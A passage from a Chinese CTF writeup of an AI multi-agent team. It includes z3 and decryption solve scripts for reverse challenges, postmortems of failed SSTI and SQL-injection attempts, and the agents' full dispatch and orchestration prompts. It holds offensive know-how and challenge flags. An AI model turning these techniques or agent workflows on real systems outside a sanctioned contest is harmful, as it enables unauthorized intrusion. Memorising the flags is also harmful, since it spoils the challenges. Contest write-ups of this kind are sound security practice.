        else:
            lines.append((ip, f'?? op 0x{op:02x}')); ip += 1
    return lines


def run_vm(prog, inp, symbolic=False):
    """Execute the VM. symbolic=False: plain emulation, returns (ok, trace).
       symbolic=True: build z3 constraints, returns the input bytes or None."""
    if symbolic:
        import z3
        s = z3.Solver()
        len_req = prog[1]  # first instr is 0xcd len check
        inp_bv = [z3.BitVec(f'c{i}', 8) for i in range(len_req)]
        for c in inp_bv:
            s.add(c >= 0x20, c <= 0x7e)
        acc, idx, ip, ok = 0, 0, 0, True
        for _ in range(1417):
            op = prog[ip]
            if op == 0x15:
                acc = acc ^ prog[ip + 1]; ip += 2
            elif op == 0x18:
                acc = acc + prog[ip + 1]; ip += 2
            elif op == 0x74:
                sh = prog[ip + 1] & 7
                acc = (z3.RotateLeft(acc & 0xFF, sh)) & 0xFF; ip += 2
            elif op == 0xe5:
                acc = acc - prog[ip + 1]; ip += 2
            elif op == 0x86:
                acc = z3.If(idx < len_req, inp_bv[idx], 0); ip += 1
            elif op == 0x97:
                idx = prog[ip + 1]; ip += 2
            elif op == 0x8f:
                s.add((acc & 0xFF) == prog[ip + 1]); ip += 2
            elif op == 0xcd:
                ip += 2
            elif op == 0x5b:
                ip = ip + 2 + prog[ip + 1]
            elif op == 0x5a:
                break
            else:
                ok = False; break
        else:
            ok = False
        if not ok or s.check() != z3.sat:
            return None
        m = s.model()
        return bytes(m[c].as_long() for c in inp_bv)
    else:
        acc, idx, ip, ok = 0, 0, 0, True
        for _ in range(1417):
            op = prog[ip]
            if op == 0x15:
                acc = (acc ^ prog[ip + 1]) & 0xFF; ip += 2
            elif op == 0x18:
                acc = (acc + prog[ip + 1]) & 0xFF; ip += 2
            elif op == 0x74:
                sh = prog[ip + 1] & 7
                acc = ((acc << sh) | (acc >> (8 - sh))) & 0xFF; ip += 2
            elif op == 0xe5:
                acc = (acc - prog[ip + 1]) & 0xFF; ip += 2
            elif op == 0x86:
                acc = inp[idx] if idx < len(inp) else 0; ip += 1
            elif op == 0x97:
                idx = prog[ip + 1]; ip += 2
            elif op == 0x8f:
                if acc != prog[ip + 1]:
                    ok = False
                ip += 2
            elif op == 0xcd:
                if len(inp) != prog[ip + 1]:
                    ok = False
                ip += 2
            elif op == 0x5b:
                ip = ip + 2 + prog[ip + 1]
            elif op == 0x5a:
                return ok
            else:
                return False
        return False


def main():
    chal = Path(__file__).parent / 'handout' / 'chal' / 'chal'
    binary = chal.read_bytes()
    prog = decrypt_program(binary)
    print(f'program len={len(prog)}  fnv1a = {fnv1a(prog):#010x} (expect {EXPECT_FNV:#010x})')
    if fnv1a(prog) != EXPECT_FNV:
        print('WARN: FNV mismatch - decryption wrong?')
        sys.exit(1)

    with open(Path(__file__).parent / 'vm_disasm.txt', 'w') as f:
        for ip, text in disasm(prog):
            f.write(f'{ip:#04x}: {text}\n')
    print(f'disasm written (vm_disasm.txt), {len(disasm(prog))} instructions')

    cand = run_vm(prog, None, symbolic=True)
    if cand is None:
        print('UNSAT'); sys.exit(1)
    print(f'z3 candidate: {cand!r}')
    print(f'z3 candidate: {cand.decode()}')

    r = subprocess.run(['./handout/chal/chal'], input=cand + b'\n',
                       capture_output=True, cwd=Path(__file__).parent)
    print(f'binary verdict: {r.stdout.decode(errors="replace").strip()!r} (exit {r.returncode})')

    r2 = subprocess.run(['./handout/chal/chal'], input=b'THJCC{test}\n',
                        capture_output=True, cwd=Path(__file__).parent)
    print(f'control (wrong flag): {r2.stdout.decode(errors="replace").strip()!r}')
    return cand


if __name__ == '__main__':
    main()
```

</details>

**TeaGod.exe**
**Flag**：`THJCC{h77p5://p4s73b1n.com/R58uv133}`

MinGW 膜拜程序，首次点击解 36 字节奖励串；`GetTickCount()&0xff` 双异或恰好抵消
是动态分析陷阱。

<details>
<summary>📜 TeaGod.exe solve.py（53 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - TeaGod.exe (Reverse, 241 pts) - flag extractor.

Static reverse of the reward decryption in TeaGod.exe (MinGW-w64 Win32 GUI).

How it works (from disassembly of TeaGodNote WndProc @ 0x140001d50):
  Clicking "WORSHIP TEA GOD" (button id 0x1001) on a TeaGodNote popup:
    - increments the worship counter (global 0x1400080c8, shown as
      "Worship count: N" in the main window)
    - kills the 0xcafe popup timer, destroys all popup windows
    - decrypts the reward string and opens the "REWARD UNLOCKED" window
      (class TeaGodReward) with the flag in an EDIT box + COPY button.

Decryption (at 0x140001e74..0x140002073):
  1. Three 12-byte ciphertext chunks pointed to by the table at
     rdata 0x140005210 -> 0x1400051e6 / 0x51f2 / 0x51fe.
  2. Per-chunk key bytes at rdata 0x140005228: [0xa7, 0x3c, 0xd1].
     intermediate[chunk*12 + i] = (cipher[chunk][i] - (25 + 7*i)) ^ key[chunk]
  3. Byte-stream key "hc_ehsna" (8 bytes, embedded as movabs immediate).
     final[i] = intermediate[i] ^ key2[(1 + 3*i) & 7]
     (a GetTickCount()&0xff byte is XORed in and out twice -> cancels, it is
      pure obfuscation to mislead dynamic analysis)

No runtime needed. Usage: python3 solve.py [TeaGod.exe]
"""
import sys

def main(path: str) -> str:
    data = open(path, "rb").read()

    # PE section layout (fixed for this binary)
    rdata_va, rdata_raw = 0x140005000, 0x4000
    def off(va: int) -> int:
        return rdata_raw + (va - rdata_va)

    cipher = b"".join(
        data[off(va): off(va) + 12]
        for va in (0x1400051E6, 0x1400051F2, 0x1400051FE)
    )
    chunk_keys = [data[off(0x140005228) + i] for i in range(3)]
    key2 = b"hc_ehsna"

    intermediate = bytearray()
    for ch in range(3):
        for i in range(12):
            intermediate.append((cipher[ch * 12 + i] - (25 + 7 * i)) & 0xFF ^ chunk_keys[ch])

    flag = bytes(intermediate[i] ^ key2[(1 + 3 * i) & 7] for i in range(36))
    print(flag.decode())
    return flag.decode()

if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "TeaGod.exe")
```

</details>

## 三、六道未解题复盘

**The Archivist**（Web 500，5 轮，全场 0 解）。击杀链打到 SSTI 执行层（自研
wasm 签名 → 实体编码绕 WAF → v2 引擎渲染），但引擎精确定性为 **stock jinja2
≥3.1.6 SandboxedEnvironment**：CVE-2025-27516 已修、151+198 个 filter 候选全灭、
108 个变量名全 stock、format-spec 下标活口在 stock globals 下不闭合。隐藏端点
`/api/export?file=` 的签名掺了客户端不可推导的服务端 secret（~95 消息格式变体全
403）。没有 0day 的话这题就是不可解的，和全场 0 解的结果对得上。

**Buggy web**（Web 500，7 轮，全场 0 解）。官方 hints 点明密码字段拼 SQL，DB 还有休眠函数，但 ~350 payload × 8 个观测维度（内容/状态码/长度/md5/cookie/重定向/
时延/崩溃）**全部恒定**。反证：`/post?id=大int` 会 500（OverflowError 不吞）而
login 从不 500 → password 进的是**结果被丢弃的查询**（疑登录审计 INSERT），黑盒
结构性无 oracle。时延通道第 8 次用交错 A/B 对照证伪：LB 的限速 stall 和 SLEEP(1) 的信号长一个样。赛后方向：注入点在登录后功能（评论区 + 审核流）。

**CTFxck**（Misc 456，12 解，10 轮）。CTFuck esolang，要写一个不超过预算的程序去处理 stdin 噪声。三轮教训递进：①预算口径最终钉死为**程序总字节 ≤111 含换行**（第 6 轮
"换行不计费"只测过单行程序）；②**假阳性级联**：超预算的程序一律被自动 nope，历史上那些"已测结论"成片作废，甚至堆出"stdin 有 UTF-16 文本区"的幻觉假设（三个真跑的程序空输出把它证伪）；③判定只对正常退出的程序给出。度量口径错误会污染之后每一轮。

**Shifting v2**（Misc 499，3 解）。密码层 100% 破解并双向验证：base64 → 27 个
平假名+苏州数字 → 码点末两位 hex 十进制 + chr(V+24) + 字母 ROT-4 → 唯一明文
`https://pastebin.com/D15r3g`。paste 全程 404（8 小时内五次核查），Wayback /
archive.today / 搜索引擎全无快照，附件哈希未换。3 个解出全在 08-15 paste 存活的
窗口期。**外部资源死亡 ≠ 解题失败**。

**All night long**（Misc 259，30 解）。一段 14 秒的音频：外段两段不同乐句（Shazam 18
变体不识别 = 梗曲 remix 不入库），中段 67ms 波形数码复制 59 次（stutter 特效制作
手法，频谱逐位相同排除逐字符编码）。卡在需要人耳认歌。

**Minecraft???**（Forensics 481，9 解）。服务器明令禁自动化工具，需要真人 MC
Java 1.21.11 客户端进 mc.pg72.tw 找讲台书。

---

## 四、反思

**编排式的甜与苦**。主 agent 不进单题细节，上下文全程干净，46 题从 08-15 傍晚打到终局不乱；但"验收"靠的是子 agent 的回报，这次用平台 solved_by_me 复核加产物目录抽查兜住了。子 agent 自己更新总表出现过两次编辑竞态，最后统一成"子 agent 只写题目
目录、总表由主 agent 收口"。

**度量口径先于一切**。CTFxck 十轮里最贵的错误不是任何一次 payload，而是"预算计量单位"搞错了。口径差一代，后面所有实验的判定成片作废，还能反向堆出幻觉假设。
任何"超过 X 就拒绝"的黑盒约束，边界实验必须覆盖计量单位的所有维度。

**统计分析的盲区要靠感知兜底**。Welcome 的单帧单字符、Afterimage1 的孤立帧，
都是统计管道全绿、人眼或多模态一眼就能看出来的题。这次把三道感知题打包外送 GPT，附带交接文档（已知事实、假阳性记录、输出格式），中了 2/3。交接文档写得好不好，直接决定外援效率。

**假阳性要有对照组**。Buggy web 的时延 oracle 三次"命中"全被交错 A/B 对照
证伪（LB stall 与 SLEEP 同形）。连续 3/3 复现也可能只是整个窗口都在 stall。

**穷尽也是一种产出**。三道未解的穷尽型题目（Archivist 5 轮 / Buggy web 7 轮 /
CTFxck 10 轮）每轮的排除面、新原语、语义修正都落盘了。赛后拿官方 writeup 来对，这些是最值钱的对照材料。

---

## 结尾

40/46（Crypto、Pwn、Rev、Welcome 全清），4504 分，排名 14。deepseek-v4-flash 与
GLM-5.3 五个主会话接力编排（模型归属逐段核自会话运行记录）、138 个子 agent
流水线（flash 68 / GLM 70，合计 6850 请求）、GPT 两次多模态出手、主 agent 两道
本地快题。完整的题解过程（每题 WRITEUP、全部脚本、CTFxck 十轮断点、Buggy web 七轮矩阵）在本地题目目录里，每题一个文件夹。能带走的东西写进了方法论文档：炸栈指纹、孤立帧差分、Ghost Bits、假阳性级联、时延对照纪律，五节（对应题目：Canary Notes、Afterimage1、SimpleNotes、CTFxck、Buggy web）；另 Reverse 四题的 cl+0x1A 滚动异或套路见 Reverse 节横联。

---

## 附录：任务编排模板首版全文（08-15 16:52 注入主会话）

第一节引用的「任务编排模板首版全文」原样附在此处；提交锁/实例锁的废除、并行度 6→3 回落等修订史见第一节（prompt 对照表 + 纪律）。当前修订版存于作者技能库 prompttemplate/ctfhunterprompt.txt。

### 真实派单示例（gaslightCTF 2026 的 4-piece-puzzle，与 THJCC 同骨架）

派单 prompt 是模板「阶段 2」的具体化：题目情报 + 模型能力边界 + 工作纪律 + 回报格式四块。
以下为真实派单全文（机器本地绝对路径已掩码为 `<工作目录>`）：

<details>
<summary>📜 真实派单示例（gaslightCTF 2026 4-piece-puzzle）（20 行）——点击展开</summary>

```text
你是 CTF 解题子 agent，负责解 gaslightCTF 2026 的 forensics 题 **4-piece-puzzle**（484 分，40 人已解）。

## 题目情报
- 题目页：https://play.gaslightctf.cooking/challenges/4-piece-puzzle
- 题面：**"these fou-fou-four puzzle pieces are my favourite colours! excuse the stutter."** —— 四块拼图 + 颜色（"my favourite colours"）+ 口吃（fou-fou-four = 4-4-4？"these fou-fou-four"可能暗示 4×4 或 444）
- 附件（已预下载）：`<工作目录>/4-piece-puzzle/puzzle_pieces.zip`（71468 字节）
- 思路起点：解压看内容（4 张拼图片？）。纯图像算法处理：颜色直方图/主色提取、拼图边缘匹配拼接、按颜色排序。"favourite colours"提示 flag 可能由**颜色序列编码**（如每块主色 → 字母/数字），拼接顺序即 flag。"fou-fou-four"可能提示 4 块 × 4 面 或 444。先 `unzip -l` + 图像信息（尺寸/模式/主色）。
- **重要边界**：当前模型无视觉能力。若解题只靠**像素/颜色数值分析**（提取主色、边缘匹配、直方图）可以继续；若卡在"需要人眼理解图像内容/语义"（看图认字、识别图形），**立即停止**，写 notes.md 断点（含已提取的颜色/结构数据）回报，不要硬耗。

## 工作纪律
1. 工作目录：`<工作目录>/4-piece-puzzle/`（中间产物放这里，禁 /tmp）。
2. 浏览器：`agent-browser --profile Default --session agent16`。打开题目页 → 填 flag 到 textbox → Submit Flag。
3. 判对信号：提交后 Solves 计数 +1 或 Submit Flag 表单消失。提交间隔 sleep 2s；判错继续，变体 ≤5 次。
4. 落盘：`WRITEUP.md`（五段式）+ `solve.py`（可复现）。被否尝试记边界。
5. 时间盒 30-40 分钟；无进展回报卡点。
6. 保密：实例地址/凭据不写入任何文档（本题无实例）。
7. **不要修改比赛总表 README.md**（主 agent 统一更新）。

## 回报格式（最后消息）
结论（解出/未解/卡点-是否视觉瓶颈）+ flag + 平台判定信号 + WRITEUP 路径 + 下一步建议。
```

</details>

<details>
<summary>📜 任务编排模板首版全文（44 行）——点击展开</summary>

```text
# 任务：CTF 全量刷题（主 agent 编排模式）

## 任务参数（换比赛/平台只改这一块；平台特定事实以实际为准，开工先侦察确认）
- 平台挑战列表：https://ctf2026-sum.thjcc.org/challenges（登录态复用 Chrome Default profile）
- 产物根目录：`THJCCCTF2026summer/`，一题一个文件夹，禁止放 tmp 或仓库根目录
- 浏览器入口：`agent-browser --profile Default`（`open → wait → snapshot -c -i → click @ref / fill 'input'`），不换 profile
- 判对信号（THJCC 实测示例，勿套用到其他平台）：提交成功提示 + 页面已解计数 +1；判错为错误提示。新平台开工先提交观察一次，把实际信号补录进本块
- 实例机制（以平台实际为准，勿预设互斥/超时）：有无实例、可否多开、生命周期各不相同；开工先确认并补录本块。实例地址不写入任何文档
- 方法论：`ctf-solver` skill（Skill 工具加载；未注册则读用户提供的技能文件路径），其 references/ 含六类题型模式文档、工具手册、payload 速查
- 环境：编程环境齐备；缺轮子按序 pip 装进项目 `.venv`（Python 3.11.11）→ brew → GitHub 检索源码安装，装完立即验证可执行；脚本兼容 macOS bash 3.2（`${VAR}` 花括号、禁数组）

## 通用规则（平台无关，跨比赛复用）

### 角色分工
- 主 agent 不亲自解任何题，只做：侦察题目列表、排序派单、提交结果验收、总表汇总；不重复提交 flag。
- 每题派一个 general-purpose 子 agent，单题过程不进主上下文。
- **并行度：同时最多 3 个子 agent 解题，题型不限**；需实例的题由子 agent 自行按平台机制启动/回收实例（实例地址从题目页获取）。总表更新只由主 agent 做，子 agent 不写总表。

### 阶段 1：侦察与排序（主 agent，轻量）
1. 打开挑战列表页，提取每题：名称、分类、分值、解出数、有无源码/附件。
2. 盘点产物根目录已有文件夹：有 WRITEUP 且 flag 已提交确认的视为完成（跳过），未完成的排入队列，不重复建目录。
3. 排序启发式（依次满足）：
   a. 非多模态优先于多模态依赖（读图/听音/视频内容才可推进的题标记待办最后做；LSB/binwalk/OCR/whisper 等纯工具可解的不算多模态依赖，按普通题做）；
   b. 有源码优先于纯黑盒；
   c. 同条件下先做解出数多、分值低的题（难度代理指标）。
4. 总表写入 `<根目录>/README.md`（挑战|分值|考点|flag|状态），逐题更新。

### 阶段 2：逐题派单（子 agent 执行，并行度 ≤3）
派单 prompt 固定骨架，自包含注入：题目名/链接/分类/描述 + 有无源码与附件路径 + 实例信息（如需，由子 agent 自行启动获取）+ 排序理由 + 以下纪律：

1. 按需加载 ctf-solver skill 按主循环走：读题 → 按分类加载对应模式文档 → 构造利用 → 有本地可复现部分先本地打通再打远程，纯黑盒直接远程打点。
2. 浏览器操作一律 `agent-browser --profile Default`。
3. 落盘纪律：`WRITEUP.md` 五段式（挑战概述→侦察结论→攻击链→复现→修复建议）；有脚本解法必写 `solve.py/solve.sh`（不写死实例地址）；调试产物（probe.py/notes.md）保留复盘价值；被否掉的尝试记一句边界（为什么不通）。
4. 保密纪律：实例 hostname、临时凭据不写入任何文档；实例地址变化后回题目页重新获取。
5. 时间盒：单题上限 30 分钟，连续 15 分钟无新进展即回报主 agent 决策（换题/加时/换思路），不无限耗。
6. 提交纪律：拿到候选 flag 后自行提交——**先取提交锁**（见「并行与互斥」），锁内串行提交、间隔 sleep 1-2s、绝不与其他 agent 并发，提交完立即释放锁。判定以该平台实际返回为准：判对信号通常是成功提示/已解计数 +1，判错是错误提示——**具体文案各平台不同，先观察本次提交的返回形态，把实际判对/判错信号记录进 WRITEUP 与回报，再据此定脚本匹配规则**（通用陷阱：勿用 `correct` 等短子串匹配判对，会误命中 incorrect）；判定为错则在时间盒内继续排查迭代；提交失败（登录过期等）回报主 agent 处理，不重复乱试。
7. 回报格式：结论（解出/未解/卡点）+ 候选 flag + 平台判定信号（实际返回文案/页面变化）+ WRITEUP 路径 + 下一步建议。

### 阶段 3：验收与汇总（主 agent）
- 以子 agent 回报的平台判定信号为验收依据，**不重复提交**；存疑时复核页面状态（已解计数/提交历史）。子 agent 回报中确认的判对信号补录进任务参数块（后续题目复用）。
- 已解 → 更新 TodoWrite 与 README 总表（flag 只出现在总表与 WRITEUP 中）；未解 → 总表标注原因。
- 每题验收清单：WRITEUP 五段齐全；solve 脚本可复现；flag 已提交且平台确认（子 agent 回报的判定信号）；目录内无实例地址泄漏。
- 比赛进行期间不推送任何 writeup/exp 到公开远端（防 DQ），结束后由用户决定提交。
- 收尾：比赛级总结（解题数/覆盖率/分题型经验），可迁移经验沉淀 `METHODOLOGY.md`。
```

</details>

